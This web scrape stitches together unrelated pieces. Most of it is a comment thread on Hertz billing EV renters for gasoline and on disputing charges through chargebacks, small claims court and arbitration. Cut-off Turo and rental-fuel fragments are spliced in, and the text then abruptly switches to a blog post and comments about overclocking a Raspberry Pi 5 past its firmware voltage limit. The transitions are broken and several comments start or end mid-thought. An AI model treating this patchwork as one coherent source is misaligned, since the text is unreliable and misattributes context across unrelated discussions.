service. Toan Le Le was able to get the fuel charge waived, but was still dissatisfied to see such a large followup bill. Despite reaching the top tier of Hertz's loyalty program, they told us they \"might reconsider renting another vehicle from Hertz.\" How many other Hertz customers have been inappropriately billed is unclear, though a March 2023 Facebook post documenting a similar case indicates this has been happening for more than a year. After hearing these stories, other EV renters may be hesitant to bring Hertz their business. They might be more wary still when they hear about people's other, more alarming misadventures with Hertz rentals. Got a tip or question for the author?

For such scams I vowed to never give my business to Hertz again. Ever. reply saligne 11 hours agoparentavis does the same thing: they ask you if you want the ez pass to be activated and if you say yes, they put abbreviations in the fine print that indicate you agreed to their ridiculously priced \"unlimited tolls\" package, even though there are other cheaper ez pass related services, and because you sign the rental agreement in order to get the keys, you don't have a leg to stand on if you dispute it later. because the charge is abbreviated, it took 20 minutes between the invoice and their website to even decipher what the charges were for. if hertz and enterprise are doing it, must be an industry-wide scam. reply fmobus 7 hours agorootparentI went to the US last year on business, and rented a car out of the airport. Not only they could not tell me in advance how much it was going to cost, but also everything in the final invoice was abbreviated and laid out in a nonsensical way. I tried summing the values in every possible way, and it never got to the total they charged. I'd be absolutely pissed if it was my money. Funnily enough, rented from the same company in Germany, and the experience was completely different. Clear value, fees, easy to understand invoice. reply Our_Benefactors 19 hours agoparentprevWow, that is highway robbery. It takes months to accrue $90 of EZ pass charges for most driving situations. reply gnicholas 13 hours agorootparentIIRC this is a fee they charge you in order to have access to the vehicle's EZ pass, not for making actual trips across EZ pass bridges or the like. So if you're going to rent a car for a week and need to cross a bridge on one day, you have to enable the charge for the entire trip, or somehow prepay the charge via some website for the bridge. This is basically impossible for a tourist to figure out, of course, so they just profit from the complexity with an all-or-nothing system. reply millzlane 15 hours agoparentprevEnterprise did the same thing to me, and I had my ez pass in the car. Not as much, though. reply unstatusthequo 19 hours agoparentprevSmall claims court. Just depends on your time value of money. Or willingness to screw with them for gigs. reply grugagag 19 hours agorootparentI was too busy to fight it off, initially called my CC and put stop on charges. Eventually they got my money. reply busterarm 19 hours agorootparentReminds me of the time I made the mistake of booking a Hertz rental through Expedia. My rental started on a daylight savings time changeover. _Hertz_ messed up the rental dates on their end of the transaction (by multiple days, even) and would not allow me to modify or cancel the rental. I ended up disputing the charge with Expedia via an AmEx chargeback and lost. AmEx owns 10% of Expedia. reply mbesto 19 hours agorootparentprevThis is a huge feature of CCs that most people don't recognize. You're paying an extra ~3% to credit card companies in exchange for the ability to dispute a charge. If a merchant (in this case Hertz) accepted cash, you would get an invoice in your hand that you could dispute on the spot and just simply not pay. The reverse would be true for Hertz who could try to sue you for not complying. reply pests 16 hours agorootparentBut then don't you get that back as cashback and such? Most complaints are people who don't pay with CC are paying a premium. reply mbesto 16 hours agorootparent> But then don't you get that back as cashback and such? Huh? You mean in the example scenario if I charge $500 for a car rental and get 2% cashback from my CC. I find out the car rental is charging me an extra $100 for gas that I never used. I'd complain because I'd lose out on the 2% * $100 difference for the $100 that my CC company gave me back as a result of the dispute charge? reply pests 16 hours agorootparent> You're paying an extra ~3% to credit card companies in exchange for the ability to dispute a charge. I was responding to this. I also don't understand after re-reading where the \"extra ~3%\" comes from. If I go to the store and spend $100 on my CC, I'll get $2 cashback. I can pay the $100 off immediately with no interest for a savings of 2%. How are they getting 3% extra from me? I know I get at least 2% back on all purchases and sometimes more depending on the card and category. This is also why I brought up that usually I hear people who pay in cash get overcharged - they pay the full $100. (leaving out how credit card fees require merchants to increase prices leading to even more expenses for cash buyers) reply mbesto 4 hours agorootparentThe \"~\" is important. Most merchants are incurring anywhere from 3~6% on charges made via CC. Likewise, your actual cashback varies (for example the highest I'm aware of is BoA's 2.65% cashback) and the average consumer is likely only getting about 1.5% cashback. So there is your delta. FYI - For people who work in payments, they know it's not as simple as this, but the point is that there is a delta between the two, and it does help pay for both of the convenience AND the ability to dispute. reply pests 4 hours agorootparentI thought your original post made it seem like only CC users get the extra 3~6% for the ability to dispute. My point in the thread was everyone pays it and it ends up being cheaper for the CC holder due to cashback. reply mbesto 2 hours agorootparent> everyone pays it \"pays it\" is relative. The merchant is generally charging 3~6% more than they would otherwise if they didn't use a CC. Said differently, assuming all other things equal, buying the same good for the same price from two identical stores, one who only accepts CCs and one who accepts cash, the one who accepts cash will profit more. Therefore they can, in theory, charge less for their good. > being cheaper for the CC holder due to cashback \"cheaper\" how? The spread is effectively paid for by the merchant (their processing fee is 99% of the time higher than the cashback bonus a consumer earns) which in turn goes to vendors (like credit card providers, payment processors, etc) who then allocate costs against things like customer service for charge disputes. EDIT: The spread is the original ~3% I'm referring to, which would be an average 1.5% cashback against a 4.5% payment processing charge for a delta of 3%. In many cases this is lower (or null) but you get the point. reply pests 36 minutes agorootparentIf both customers are shopping at the same store, and one pays in card and one pays in cash, the card holder pays less due to cashback. I agree the prices will be higher than at a store that does not accept credit cards due to not having to pay the fees. The only way I see the extra 3% for cardholders is because they are \"forced\" to shop in card-accepting establishments which will have higher costs to cover fees while the cash user can choose the cheaper cash vendor. reply reaperman 17 hours agorootparentprevThey'd end up doing something like you pay $2000 in cash upfront and then you get the unused portion back at the end, and GDP would lower significantly because most people can't afford to give businesses a line of credit like this. reply mbesto 16 hours agorootparentThere'd be no market for $2000 cash upfront. reply saagarjha 17 hours agorootparentprevIf you refuse to pay they're probably going to send you to collections… reply mbesto 16 hours agorootparentSure, but collections for something they have no justifiable reason to collect on? To be clear, what I'm suggesting is (a) hypothetical to understand the business rationale and (b) is under the premise that what is on the bill matches the service you retained. In my theoretical scenario, the onus is on the merchant to prove they've provided the service you've paid for. The reason car rentals provide the convenience of charging your credit card without the immediate authority of you reviewing the charges is a feature of credit cards over cash, and a benefit to consumers. The other feature is that you can dispute those said charges if the merchant is also charging you for services/goods you never received (e.g., gas for an EV). reply saagarjha 13 hours agorootparentMy understanding is you can get sent to collections for basically any reason and debt collectors will hound you without regard to whether it is something you should be obligated to pay or not reply mbesto 2 hours agorootparentAnd I can create a class action lawsuit for literally anything I want. Doesn't mean I'm going to win. What's your point? reply sneak 15 hours agorootparentprevYeah, this is mostly a fiction, much like the idea that if someone steals from you, your tax dollars fund the police, and you can call them and they'll do anything meaningful. It's a belief held by people who don't actually try to use these systems. Major credit card companies aren't in the business of consumer protection. Many times I've tried to do chargebacks, only to be denied by the card issuer with some unsubstantiated claim by the vendor that they held up their end of the transaction. No recourse short of spending four or five figures on a lawyer and a lawsuit. As a result, if they cheat you out of less than $5k, they win. reply Teever 19 hours agorootparentprevI'd love to see a campaign to coordinate small claims court claims against abusive companies. It could really fuck a company's day up if several hundred to thousand people across the world decides to seek redress from a small claims court on the same day. reply InfamousRece 19 hours agorootparentCan you use a small claims court if the rental contract has mandatory binding arbitration clause? reply Animats 15 hours agorootparentIf the arbitrator is specified as the American Arbitration Association, usually yes. See section R-9 of the AAA Consumer Rules.[1] JAMS just updated their \"minimum standards\" for consumer arbitration as of May 1, 2024, and they now seem to allow for transfer to small claims court.[2] [1] https://adr.org/sites/default/files/Consumer_Rules_Web_0.pdf [2] https://www.jamsadr.com/consumer-minimum-standards/ reply samatman 18 hours agorootparentprevYou absolutely can. Now the company has to pay one of their lawyers ($$$) to show up, or the claim is a default judgement, which they have to pay. So the lawyer shows up and says blah blah mandatory binding arbitration. The judge can interrupt and say \"don't care, judgement against, pay the man\". Or the opposite, in which case at least you cost them more than they cost you. Which is why they probably take the default judgement and pay you. reply ensignavenger 18 hours agorootparentAt least in some courts, I would think filing a motion to dismiss would be enough, without swnding a lawyer to court... but I have never been theough that process before so I can't say for sure? Still takes time, and arbitration isn't all that scary, ao forcing them to arbitrate can also be a costly endeavor for them. reply kelnos 18 hours agorootparentprevIn the latter case, don't they then ask the judge/arbitrator to also award them legal fees if (when, really) they win? reply Staple_Diet 16 hours agorootparentIn most situations small claims court is generally self-represented, with claims for legal costs capped at a certain level dependent on the amount being claimed. For example, in NSW, Australia, there is a different cap for costs under $1000 vs $1000-$5k, and $5k-$20k. One might expect a judge to look poorly upon a large multinational sending a $2k/hr lawyer to a $500 hire car dispute. reply klyrs 15 hours agorootparentprevWhere I live, you can't claim a lawyer's fee in small claims court -- that's kinda the point of small claims. reply crooked-v 18 hours agorootparentprevYeah, the key thing here is that even if the arbitration agreement is binding, they have to have someone actually show up and prove that to the judge. So multiply that across even a few hundred times... reply blackeyeblitzar 18 hours agorootparentprevI don’t think you can unfortunately, and arbitration should be banned. I’m not sure how a system overriding the legal system is allowed. reply eadler 15 hours agorootparentThe Supreme Court has repeatedly and willfully ignored the plain meaning of the statutes, congressional intent in writing the FAA, as well the standard rules of statutory interpretation effectively rewriting Title 9 into something it was never intended. At this point fixing it requires congressional action. See https://arbitrationinformation.org/docs/problems/ and https://arbitrationinformation.org/docs/solutions/ for my complete writeup. reply sircastor 17 hours agorootparentprevIt’s not overriding the legal system, it willfully sidestepping it. But obligating the contracted party to agree. The issue of course is that Hertz (in this case) can put whatever random requirements into the contract, and you can’t arbitrarily strike them. You still need/want their service. That said, just because there’s an arbitration clause in the contract doesn’t mean you’re absolutely stuck. You can hire a lawyer and try to get out of it. They’re trying to keep you from doing something like that. reply asvitkine 19 hours agorootparentprevIf it's to dispute small charges, the company doesn't need to show up and just accept the loss. reply xvector 16 hours agorootparentprevI'd be down to help build a service like this. reply Teever 16 hours agorootparentHow can I reach out to you about this? reply coleca 16 hours agoprevHadn’t rented from Hertz in many years until last week. Made sure to fill the tank back up as high as it would go just in case. Get thru security at the airport and already had a $26 charge for fuel. Still working on getting this fixed. Funny how they can charge within 5-7 minutes but they take 5-7 business days to process a refund. reply jonhohle 16 hours agoparentGood luck. I’m fighting them from the beginning of April because they failed to check the car in properly (I asked for a receipt and they said they couldn’t print one at the return, despite being in the receipt line). I got charged for the next renters days, late fees, recovery fees, and tolls accrued by them. They agreed to refund (which still hasn’t happened) and a few days later they charged me for not returning the car full (it was). Fortunately for us it’s just a credit card charge that’s being disputed. For friends of ours they reported the car stolen and filed a police report. This doesn’t seem like how a legitimate business operates, but more like a syndicate. While I understand individual locations are franchises, they have eerily similar catastrophic failures that seem to regularly occur. reply gdudeman 14 hours agoparentprevI recommend disputing the charge with your credit card. My credit card refunded my Hertz bill in under five minutes of clicking online. reply lolinder 14 hours agorootparentThis is probably important context to include when you make this recommendation (from your other comment): > Ultimately they sent me a bill for the cost of the rental minus the gas and threatened to take me to collections if I didn't pay it. This is the always-necessary reminder that credit card chargebacks do not in fact relieve you of the duty to pay for services that you did receive. A chargeback may be necessary to get the merchant's attention, but you do need to be careful to actually pay them the correct amount in the end. https://news.ycombinator.com/item?id=40412246 reply mendelmaleh 14 hours agorootparentprevIf they did a chargeback, Hertz might dispute it, send you collection letters and terminate your account. reply lolinder 14 hours agorootparentIt's funny you should say that, because OP actually tells a more complete version of the story here [0]. Hertz did send them a new bill with a threat to send it to collections if it weren't paid. Maybe still a win in the end because the incorrect charge was removed, but I get really uncomfortable with how casually people recommend chargebacks on this forum. They're not intended to get you out of charges that the other party can prove you did agree to pay. [0] https://news.ycombinator.com/item?id=40412246 reply falseprofit 13 hours agorootparentThe context here was a charge that should not be paid… reply lolinder 12 hours agorootparentBundled with a bunch of charges that were, in fact owed. OP disputed the whole charge (probably because that was the only option), but it's important to know that Hertz did come after him for the rest of the money. reply gdudeman 14 hours agoprevI got a $80 bill from Hertz for returning a compact car without gas. I had returned the car with a full tank of gas though! There is no way to resolve this on the phone, so I filled out their online form to dispute the charge. After not hearing from Hertz for 2 days, I disputed the charge with my credit card. The credit card instantly refunded the entire cost of the rental. Within 12 hours of the refund, I got an email from Hertz saying they were sorry about the accidental charge and that they'd give me a free one day rental. Ultimately they sent me a bill for the cost of the rental minus the gas and threatened to take me to collections if I didn't pay it. I never got my free rental. reply charles_f 19 hours agoprevThis is a simple case where it's pretty easy to prove that they made a mistake, but I once got charged for skip the pump, despite a) i had filled in the tank, b) the tank was not even full when I picked the car. Lucky enough I always keep the pump receipts and they ended refunding me, but I'm left to wonder how many people get charged those fees and can't get them reversed reply Yesman85 19 hours agoparentEvery single time I rent a car in Vegas. No matter what company, I get dinged for gas. Keep all my receipts and make a video showing the gauge while dropping off the car. It's just an admin hassle each time. reply psynister 19 hours agoprevI have had nothing but bad experiences with Hertz. Unfortunately the corporate rate we get is very low so I'm stuck with them, but it seems like there is always something that goes wrong. I drove out of their facility, had a low tire pressure indicator on, brought it back and they wanted me to sign something saying I was responsible for damage to their tire. reply SoftTalker 16 hours agoprevWhen people suggest owning an EV for daily use and renting a gas car for occasional long trips, this is exactly why that's not a attractive idea for most people. Even in the best case scenario, renting a car is a time-consuming hassle and you have to navigate high pressure tactics on buying upgrades, fuel, insurance, etc. reply epcoa 15 hours agoparent> Even in the best case scenario, renting a car is a time-consuming hassle No that’s the worst case scenario. > you have to navigate high pressure tactics on buying upgrades, fuel, insurance, etc. No you don’t. In the US, the major reputable companies allow you to register your DL and insurance, pick your default fuel preference. 20 minutes prior the reservation you get a list of available cars and proceed directly to the car. You then scan a QR code at the exit, maybe you show your DL to a guy at the gate, who is in no position to sell anything. This is for almost all airport locations and many corporate locations. Even when you see an agent.. High pressure tactics? That’s impossible, they have no leverage. It’s not like buying a hot new car or something. The insurance is usually worthless to you so you aren’t losing anything by walking away. Just say no? A simple no always works. Carry a credit card with primary rental insurance. I have had a sales person try to give some bullshit song and dance even when I politely tell them I have primary insurance on my card. It’s a simple “no, not interested.” What are they going to do? reply millzlane 15 hours agorootparentRented from enterprise last month. I booked a Sports Car Rental (Dodge Challenger or Similar). I got there and they only had a miata. Certainly a cool car. But it's too small for me. I needed a Dodge Challenger or similar. So I ended up with the slowest truck imaginable with no fuel in it. They wouldn't give me my company's corp. rate even though I had my work badge and this rental was for a work training in DC. Oh! and I brought my own EZ pass, but somehow the enterprise car somehow still charged me for tolls. But not without the extra convenience fee. Rental car companies here suck. reply epcoa 15 hours agorootparent> and I brought my own EZ pass, but somehow the enterprise car somehow still charged me for tolls. If they charged for tolls that can only mean they got billed by tolling agency, often by plate reader. I mean it kind of sucks but if your ezpass doesn’t work not sure how that makes the rental company responsible. reply millzlane 15 hours agorootparentBecause it costs nothing to pay the toll and charge me the toll in their automated system. reply listenallyall 12 hours agorootparentprevSorry I have plenty of issues with car rental companies but dude - if you need a car of a certain size, rent that size, not \"sports car\". And book through your company's travel service, with the proper company code, no counter agent knows what your company badge is, and they certainly don't care that you're going to a work-related training. E-Z Passes are, unfortunately, usually tied to a specific license plate. For example, the Maryland and Virginia E-Z Passes require you to log into your account and enter the rental car's plates. It's understandable one might not realize that, but at the same time, that's EZ Pass setting those rules, not Enterprise. https://driveezmd.com/acct-types/e-zpass-faq/ https://tollguru.com/va-ez-pass-rental-car/ reply epcoa 11 hours agorootparentFurthermore in states with pay by plate as a fall back like NY and IL you can register the rental car plate for the duration of the rental. https://www.tollsbymailny.com/vector/videotolls/paytollnow/s... reply listenallyall 11 hours agorootparentThis is an area where the governments are short-sighted and it's very hard to blame individual renters. Many of these states have no option to pay cash tolls anymore. Further, not everyone in a rental (often in a strange place) knows they will use a toll road, so you really can't blame people for failing to register ahead of time (either the plates or via E-Z Pass) -- plus the fact that you don't know the plates until you're physically at the car, it's not like you can pre-register a week in advance, even if you wanted to. You'd think by now some of these transportation authorities would set up some payment system with Google & Apple Pay as a cashless alternative for people without an EZ Pass. reply epcoa 9 hours agorootparent> it's not like you can pre-register a week in advance True, although you usually have a 48 hour window to post register. Not saying this is the most consumer friendly setup, but the fees are avoidable. > Further, not everyone in a rental (often in a strange place) knows they will use a toll road When I end up in a such a state I reflexively register (actually use a checklist, can take care of this in the hotel room in the evening for instance) regardless of whether I plan to use a toll road or not. There’s no guesswork to this other than knowing what states I’ll be in. Always make sure the rental car either does not have a transponder or that it is closed in its shielded box. If you’re dealing with an agent always make sure every add on service is declined. > Google & Apple Pay as a cashless alternative for people without an EZ Pass. But how would that work with open road tolling? reply listenallyall 4 hours agorootparentYes, technically they are avoidable, but it sounds like you are an outlier - doubtful that lots of people spend precious travel time (especially if with family/kids) registering on government web sites. Very doubtful that many people have checklists for this purpose. > But how would that work with open road tolling? For one, both companies also operate GPS services so perhaps it could all be integrated. Or just have one or two lanes available for people to slow down and tap to pay (still benefit from no staffing the toll booth). Or you could have a pull-off area right after the tollbooth with QR codes to pay by PayPal, Venmo, etc. reply brailsafe 14 hours agoparentprevI don't own any car and exclusively rent from one of a few companies (probably all owned by Hertz). I've heard a lot of horror stories, but really haven't ever run into a problem, to such an extent that buying another car has not crossed my mind in any serious way in the last 6 years since my last one died. So anecdotally, I'd highly recommend this, because owning a car is a massive pain in the ass logistically and financially, and I'm happy to not have one. Sometimes (maybe one rare time every two years) I need a rental for the same short time on a weekend that everyone else does, and that's a bit inconvenient, but couldn't bother to care so much. The only thing I'm relatively cautious with is suspiciously high deposits/credit authorizations. When I run the numbers, it would literally take years for the amount I spend renting to surpass the amount I'd spend on just the sales tax or insurance for a hypothetical viable car. It turns out that owning a car is like owning a McMansion, such that you end up inflating your lifestyle to fill the space or depend on the car. reply plorkyeran 12 hours agoparentprevMy typical car renting experience is that I pull out my phone, launch the app, walk to where it tells me the car is, and then get in the car and drive away. That’s for short term rentals that aren’t priced for multi-day things, but going up to ten minutes of overhead for a week rental is still only a minor annoyance. I have never encountered any sort of high pressure sales for rentals, and all of my negative car rental experiences have been at airports and not in scenarios where owning my own vehicle would have let me avoid the rental. reply pquki4 8 hours agorootparentYou are lucky if you can get a car in 10 minutes. Almost every time the agent would be helping other people and I would just wait for at least 10 min. reply xyst 14 hours agoparentprev> high pressure tactics front desk: “want to add fuel protection” me: “no” front desk: “Okay, sign rental agreement and sign here to indicate you declined protection. Here’s your keys. “ I would say a majority of the time it’s just a script they are told to recite. Dealerships on the other hand is a whole new beast. I wish very much that dealerships in the US go away. Unnecessary middlemen used to extract as much profit with no added value.

I've had nothing but good experiences with Turo (15 or so rentals, ranging from a single day to a 2-week rental). With the legacy rental companies, the best experiences are barely mediocre. [0] One big one is that credit cards that offer insurance for rental cars won't cover services like these. reply sf_rob 16 hours agoparentThe only EV I’ve rented from Turo was the opposite experience. They gave me the car at 75%, they capped charging at 90% in settings, then they charged me for bringing it back at 70% (which was just past their threshold but considering I could only charge it to 90% that should be the baseline). reply nicce 16 hours agoparentprevI just found the Turo first time, and the prices seems to be like 4 times more?

How could filling a sedan with gas cost $200 to $400? That’s like 10x what the actual gas costs retail at the pump. reply kelnos 18 hours agoparentYou're paying for convenience. The deal they make with you up front is that you get to not worry about the tank, but in return you pay a super inflated rate for the gas. Plus you pay for a full tank, even if you return it at 3/4 and it only takes a few gallons to fill it. I get that some people just don't have the time (or executive function?) to deal with refilling before return on some trips, or they're so rich that they just don't care, but otherwise I just do not get why anyone would accept this option. reply reaperman 17 hours agorootparentA lot of car rentals go on a corporate tab. When high-impact employees are traveling, their time is very valuable. An extra 20 minutes for the employee to spend with the customer on the last day could easily be worth $150 to their employer. Some businesses are happy to pay inflated prices for gas just in case their employee needs that extra 20 minutes onsite before returning to the airport. reply s0rce 15 hours agorootparentAlso better than missing a flight if you end up running late for whatever reason. reply listenallyall 12 hours agorootparentprevActually the deal, typically, is that if you buy a full tank up front, the per-gallon price is at par or even a bit cheaper than local gas stations, so you save money and gain convenience (that's the pitch). By contrast, if you don't buy gas up front, and don't return the car full, that's when they charge you an enormous per-gallon price. That price is highly profitable and also makes the \"up-front\" option seem more appealing. (Just take 10 minutes and return the car full, and don't worry about any of this) reply kevingadd 18 hours agoparentprevIf you check what rental companies charge for gas when you pick up a car, they typically list something like $12/gallon here if you don't prepay, and something like $5-7/gallon if you \"buy the tank\". This vs maybe $3-4/gal at the nearest station. reply s0rce 15 hours agoprevHertz told me I would be charged if the car wasn't returned charged, I asked how much and they couldn't say. I was also confused because it wasn't clear how to charge at the airport and that was very inconvenient, I'd rather charge the night before near my hotel. No answer but they said its fine to return it 85% charged. I went out to get the car and the guy said I needed to return it 80% charged. I got in and it was less than 80% charged... wonderful experience. reply infecto 19 hours agoprevSadly I think most car rental companies are filled with fine print hell. The one that has bitten me a few times is the minimum miles fee. Rent a car at the airport because it’s cheaper than an Uber. Drive to a friends house and the vehicle never is used until return. Since it is bellow some threshold, 30 miles or so, you get charged a $15-25 fee unless you had shown a receipt for gas. reply CantPickAName 17 hours agoparentWow...didn't know this was a thing. I got bit by the opposite where one of my rentals had a maximum miles limit. I use a corporate code that usually includes unlimited mileage but this location didn't offer that. They had a limit of 300km unless you paid extra and since I skip the counter and go directly to the garage to pick a car, I wasn't aware of that. It was only when they emailed me the receipt later that I saw the extra charges. reply msadowski 13 hours agoprevOne thing I learned really quickly renting in Europe is to take pictures of the rental before driving off. Last time I rented a car there was a huge scratch on the side that wasn’t included in their pickup form.

Even if they screw this up (intentionally or otherwise) with 10% of all rentals, you're still unlikely to have a problem with only two experiences. reply whoiscroberts 19 hours agoparentprevGreat question and point. I was be surprised if there was not an incentive for the manager at each individual location to push up incidental charges. reply geraldwhen 18 hours agorootparentOf course there must be.

Why is there such a legal power imbalance between people and companies, especially large companies? If a company wants to charge me extra they just do it, they don't have to provide proof of anything. If I want to resolve the issue I have to call them or my credit card company, neither is simple and has something like a 75% chance of being successful (IME) even if I'm completely right. On two separate occasions a company has charged me for something and after I've made multiple calls and escalations (which of course can only happen during certain hours) they finally refunded me by saying \"we'll make a one-time exception as a favor to you\" even though they were literally stealing from me. In one case they only finally did it after I contacted the attorney general. Honestly I don't even really care if it was a mistake (which are usually systemic issues) vs intentional, it is theft. In one example Comcast charged me a late fee even though I had autopay set up and they just missed running the charge. I wonder how many people just didn't notice. I've long thought the only solution to these issues is to levy fines (or jail time if intentional theft) large enough to discourage the behavior. If it is still happening, keep raising the fines until it stops. reply Nathanba 13 hours agorootparentThe question shouldn't be \"why\" because the answer is obvious: Companies have more money and more people and more time and therefore more power than you as an individual. The solution also already exists: The government should be giving individuals free lawyers to go after companies who violate their rights. We have this system in my country where there is a people's lawyer that can choose to take up cases that seem deserving. Then we also have certain government sponsored union-like associations whose job it is to sue companies who commit wage theft and they are good at it. After all when some random person steals from you, you generally also don't have to sue them and hope a court decides in your favor. That is all the job of the government (=police). Private individuals should not have to waste their time in the legal system to defend laws that the government created. reply 6510 12 hours agorootparentFor a lot of simple and obvious things the formula should be to call and report a \"disagreement\". The government employee who took the call [immediately] calls to hear the company side of the story and orders it to correct it's behavior or may chose to issue a fine. The issue is resolved in 5-20 minutes. A different fine tailored for the size of the company for not responding fast enough. If the company disagrees with the verdict they may take the government agency to court. This should mostly happen if the issue is arguably not simple and obvious enough. If the customer disagrees the court is also there to figure out the mess. > Private individuals should not have to waste their time in the legal system to defend laws that the government created. Government should not make a mockery of it self by creating laws that it doesn't intend to enforce or is incapable of. reply mirsadm 13 hours agorootparentprevIt goes beyond just stealing some money.

IMHO a state should just not allow corporations to grow beyond a certain marketcap level. I see no real world benefit to allow such companies to exist, it creates \"too big to fail\" schemes, inefficient structures, and overall companies that are able to compete with literally small states or countries in terms of capital /legal / lobby power. Beyond a certain marketcap, a company should not be allowed to grow anymore and just forced to split in multiple entities. reply kevinob11 12 hours agorootparentI'm surprising myself a bit, but I think I agree. I think these types of problems are inherent in companies of a certain size. When you reach a point where there is so much structure that you can only progress via metrics those metrics will inherently start to only serve themselves instead of the original goal they were attempting to be a proxy for. reply Galanwe 11 hours agorootparentWhen you think about it, the \"winner takes all\" martingale is already forbidden in most states of law. Two companies are not allowed to merge if their total market share would past 30%, because that would allow a monopoly and thus total control over the price of goods. A winner cannot just buyout his previous opponents indefinitely. Similarly, a company cannot (at least where I live) sell at a loss. That would allow a company with more capital to lower prices at an impossible level until competition dies out, and then increase prices back when concurrents are wiped out. These regulations are different of course, but the overall idea is similar: a company should not be able to press its advantage exponentially. And I think the marketcap is but a forgotten rule in these regulations. Once a company reaches a monstrous level of market cap, it is too diversified to fail, and can press its legal / lobbying leverage on some of its subbusinesses at an unfair level against competitors. If you're a search engine company, competition against Google is not just competing against an other player in the search space. You're competing against the legal and lobbying power of 10 companies. And that's not even mentioning state supremacy concerns. I vote for my government. They may not be always want I want them to, but hey, that democracy. I don't vote for mega corps governance.

Aurornis 16 hours agoparentprev> Why do consumers have no recourse against companies that steal from them? Stuff like this is easy to charge back with your credit card company. But in this case, the article makes it clear that the people were able to get the charges reversed by talking to Hertz. It wasn't necessarily convenient, but the funds were returned when a human saw the mistake. > If I made charges to someone's card for services that weren't rendered, I'd probably go to jail. If you entered into an agreement with someone to do business and then accidentally charged them the wrong amount, you would not go to jail. That's what happened here, as annoying as it is. I know this is HN and we're supposed to get our pitchforks out any time a company makes a mistake, but your analogy doesn't hold. Legally, intentional theft is a higher bar than a mistake. You're right that you'd be in trouble if you just started charging random people's credit cards fraudulently, but you're not going to jail if you're doing business with someone and you occasionally make a mistake about the amount when it's time to bill them. (FYI: Billing mistakes happen all the time at scale) If you could prove that someone in Hertz was diabolically masterminding a scheme to knowingly milk money from customers by charging EV drivers for gas, you could have a case.

Geekbench takes ages to run and has a large run-to-run variance. sysbench cpu run allows me to iterate more quickly. I'm using this cooler, and I haven't tried any other cooling solutions. over_voltage_delta=50000 arm_freq=2900 force_turbo=1 total number of events: 32951 total number of events: 32954 over_voltage_delta=50000 arm_freq=3000 force_turbo=1 total number of events: 34076 total number of events: 34094 over_voltage_delta=50000 arm_freq=3200 force_turbo=1 total number of events: 36373 total number of events: 36365 arm_freq=3300 or 3.3Ghz is where it gets very unstable. Firmware The 1V limit is in the firmware. The Raspberry Pi is weird, because it starts by running code on the VPU/GPU. It's an obscure Brodcom VideoCore instruction set. There's a PDF documenting the Raspberry Pi 4 boot security. Basically the first 3 boot stages are BOOTROM (AKA BL0), bootsys, and bootmain. Bootrom is baked into the CPU, bootsys and bootmain are signed, so I can't modify them without the signing key, which I don't have. Somehow I doubt Raspberry Pi or Broadcom would hand me the keys. There's some differences between the Raspberry Pi 4 and 5 boot process. There are some tools to parse and extract the Raspberry Pi 5 firmware (stored on the eeprom): https://github.com/info-beamer/rpi-eeprom-tools https://github.com/raspberrypi/rpi-eeprom/ Handily, a Github user made Ghidra support for Videocore. Searching bootmain for \"volt\", I found what looks a lot like a voltage limiter. A single mov.cc instruction can be patched to remove the voltage limit. However, it's in bootmain, which is signed, so we can't just patch bootmain and flash the eeprom. However, as a root linux user on Raspberry Pi full access to system memory, including memory used by the videocore. I mmap'd /dev/vc-mem, searched for the instruction and replaced it, but i'll leave that as an exercise to the reader. I don't want people blaming me if their Pi decides to halt and catch fire. Slowing down before I speed up If I set arm_freq=3300, it isn't stable. Also, I can't use force_turbo. To get it usable, I limited the cpu to 2.9Ghz as early as possible: /lib/systemd/system/slowcpu.service [Unit] Description=Slow CPU Before=basic.target After=local-fs.target sysinit.target DefaultDependencies=no [Service] Type=oneshot ExecStart=/bin/bash /slowcpu [Install] WantedBy=basic.target /slowcpu echo 2900000tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_max_freq sudo systemctl enable slowcpu.service From there, I can remove the voltage limit: sudo ./removelimit && vcgencmd cache_flush Then I can put the frequency limit back up to 3.3Ghz echo 3300000sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_max_freq And make it like force_turbo was on: echo performancesudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor Checking my voltage and clock with over_voltage_delta=60000: $ vcgencmd measure_volts volt=1.0437V $ vcgencmd measure_clock arm frequency(0)=3300034816 After all that... total number of events: 37713 total number of events: 37712 ...That wasn't worth it.",

I'm hoping to get time to delid one, put on a peltier cooler, and try to control the temperature a little better for a run to see how high it'll go before either burning up or going unstable. From my testing on clocks on the Pi 5, it looks like the default clock of 2.4 GHz is pretty close to the sweet spot for this chip (BCM2712), and you burn a lot of power for small incremental gains after that[1]. (Which you seem to also show with the 3.3 GHz overclock!). I also spoke to one of the Pi engineers about the chip behavior at higher clocks, and he suggested unlike some chips, this chip might run more stably at higher temperatures (like 50-60°C) rather than 'as cold as you can get it'. So that poses some challenges since most cooling solutions aren't tuned for 'keep a temperature' but instead 'get it as cold as possible', without a lot of manual tweaking. [1] https://www.jeffgeerling.com/blog/2023/overclocking-and-unde... reply c0balt 2 hours agoparentThis might be naive but you may take a look at warm water cooling from HPC/ Hyper Scalers. Combined with a custom block this should stay stable at the 50-60° sweet spot. reply metadat 17 hours agoparentprevDid the engineer explain why the higher temps contribute to stability? I've not heard of such a phenomenon before. reply geerlingguy 17 hours agorootparentNo physics-level explanation, just that they found the chips to be more stable in testing when they were a little warmer vs a little colder. The key was to keep them around that temperature, though, which still requires a good amount of cooling the more voltage that runs through it! Just... he mentioned I might not have as much success using LN2 or something more exotic, compared to standard water or Peltier cooling. reply metadat 16 hours agorootparentThat's pretty crazy, thanks for sharing, Jeff. Overclocking was my bread and butter as a [relatively] broke teenager in the late nineties, around the era of the first Athlon Thunderbirds, when you could take a 1GHz chip and [maybe] OC it to 1.5Ghz. It was a great time to be alive, and yet this is the first case I've heard of where LN2 would not give you a dramatically better result 99.99%+ of the time! I still miss HardOCP and Kyle Bennett and his team's reviews. That one t-bird with char spots... It still worked reliably somehow, I might even have it in a box somewhere. Those swirly finned CPU coolers were shit! I came home every day after school and volted/burned the hell out of that poor chip, not realizing what I was doing.. lol. reply toast0 14 hours agorootparent> I still miss HardOCP and Kyle Bennett and his team's reviews. Kyle stil posts on Hardforum, and much of the team went on to https://www.thefpsreview.com/ but it's not really the same, because there's no 50% overclocking by just moving a jumper. CPUs and GPUs get factory overclocking that's probably within 10% of what you can get with reasonable efforts. reply stavros 9 hours agorootparentIf it comes like that from the factory, is it overclocking? Isn't it just clocking? reply viciousvoxel 3 hours agorootparentpotato, overpotato reply K0balt 16 hours agorootparentprevI still remember my dual celeron 450 clocked to 900 mhz. Those chips ran rock solid at double their rated clock, no didling the voltage or anything. Just needed decent cooling. Never mind that at 